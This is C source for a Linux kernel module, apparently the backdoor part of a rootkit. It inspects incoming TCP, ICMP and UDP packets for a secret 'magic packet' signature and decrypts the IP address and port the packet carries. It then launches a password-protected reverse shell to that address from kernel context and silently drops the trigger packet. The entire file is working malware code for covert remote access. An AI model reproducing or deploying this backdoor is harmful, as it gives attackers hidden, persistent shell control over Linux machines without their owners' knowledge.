#include <linux/string.h>
#include <linux/version.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/workqueue.h>

#include "util.h"
#include "config.h"
#include "backdoor.h"

struct shell_task {
	struct work_struct work;
	char *ip;
	char *port;
};

void shell_execer(struct work_struct *work)
{
	struct shell_task *task = (struct shell_task *)work;
	char *argv[] = { SHELL_PATH, "-t", task->ip, "-p", task->port, "-s", PASSWORD, NULL };

	exec(argv);

	kfree(task->ip);
	kfree(task->port);
	kfree(task);
}

int shell_exec_queue(char *ip, char *port)
{
	struct shell_task *task;

	task = kmalloc(sizeof(*task), GFP_KERNEL);

	if (!task)
		return 0;

	task->ip = kstrdup(ip, GFP_KERNEL);
	if (!task->ip) {
		kfree(task);
		return 0;
	}

	task->port = kstrdup(port, GFP_KERNEL);
	if (!task->port) {
		kfree(task->ip);
		kfree(task);
		return 0;
	}

	INIT_WORK(&task->work, &shell_execer);

	return schedule_work(&task->work);
}

#define DROP 0
#define ACCEPT 1

unsigned int magic_packet_parse(struct sk_buff *socket_buffer)
{
	const struct iphdr *ip_header;
	const struct icmphdr *icmp_header;
	const struct tcphdr *tcp_header;
	const struct udphdr *udp_header;
	struct iphdr _iph;
	struct icmphdr _icmph;
	struct tcphdr _tcph;
	struct udphdr _udph;
	const char *data = NULL;
	char *_data, *argv_str, **argv;
	int size, str_size;

	if (!socket_buffer)
		return ACCEPT;

	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

	if (!ip_header)
		return ACCEPT;

	if (!ip_header->protocol)
		return ACCEPT;

	if (htons(ip_header->id) != IPID)
		return ACCEPT;

	if (ip_header->protocol == IPPROTO_TCP) {
		tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_tcph), &_tcph);

		if (!tcp_header)
			return ACCEPT;

		if (htons(tcp_header->source) != SRCPORT)
			return ACCEPT;

		if (//htons(tcp_header->seq) == SEQ &&   /* uncoment this if you wanna use tcp_header->seq as filter */
			htons(tcp_header->window) == WIN) {
			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_tcph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return ACCEPT;

			str_size = size - strlen(MAGIC_VALUE);
			argv_str = kmalloc(str_size, GFP_KERNEL);

			if (!argv_str) {
				kfree(_data);
				return ACCEPT;
			}

			data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct tcphdr), size, &_data);

			if (!data) {
				kfree(_data);
				kfree(argv_str);
				return ACCEPT;
			}

			if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {

				memzero_explicit(argv_str, str_size);
				memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
				do_decrypt(argv_str, str_size - 1, KEY);

				argv = argv_split(GFP_KERNEL, argv_str, NULL);

				if (argv) {
					shell_exec_queue(argv[0], argv[1]);
					argv_free(argv);
				}

				kfree(_data);
				kfree(argv_str);

				return DROP;
			}

			kfree(_data);
			kfree(argv_str);
		}
	}

	if (ip_header->protocol == IPPROTO_ICMP) {
		icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);

		if (!icmp_header)
			return ACCEPT;

		if (icmp_header->code != ICMP_ECHO)
			return ACCEPT;

		if (htons(icmp_header->un.echo.sequence) == SEQ &&
		    htons(icmp_header->un.echo.id) == WIN) {

			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return ACCEPT;

			str_size = size - strlen(MAGIC_VALUE);
			argv_str = kmalloc(str_size, GFP_KERNEL);

			if (!argv_str) {
				kfree(_data);
				return ACCEPT;
			}

			data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);

			if (!data) {
				kfree(_data);
				kfree(argv_str);
				return ACCEPT;
			}

			if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {

				memzero_explicit(argv_str, str_size);
				memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
				do_decrypt(argv_str, str_size - 1, KEY);

				argv = argv_split(GFP_KERNEL, argv_str, NULL);

				if (argv) {
					shell_exec_queue(argv[0], argv[1]);
					argv_free(argv);
				}

				kfree(_data);
				kfree(argv_str);

				return DROP;
			}

			kfree(_data);
			kfree(argv_str);
		}
	}

	if (ip_header->protocol == IPPROTO_UDP) {
		udp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_udph), &_udph);

		if (!udp_header)
			return ACCEPT;

		if (htons(udp_header->source) != SRCPORT)
			return ACCEPT;

		if (htons(udp_header->len) <= (sizeof(struct udphdr) + strlen(MAGIC_VALUE) + 25)) {

			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_udph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return ACCEPT;

			str_size = size - strlen(MAGIC_VALUE);
			argv_str = kmalloc(str_size, GFP_KERNEL);

			if (!argv_str) {
				kfree(_data);
				return ACCEPT;
			}

			data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct udphdr), size, &_data);

			if (!data) {
				kfree(_data);
				kfree(argv_str);
				return ACCEPT;
			}

			if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {

				memzero_explicit(argv_str, str_size);
				memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
				do_decrypt(argv_str, str_size - 1, KEY);

				argv = argv_split(GFP_KERNEL, argv_str, NULL);

				if (argv) {
					shell_exec_queue(argv[0], argv[1]);
					argv_free(argv);
				}

				kfree(_data);
				kfree(argv_str);

				return DROP;
			}

			kfree(_data);
			kfree(argv_str);
		}
	}

	return ACCEPT;
}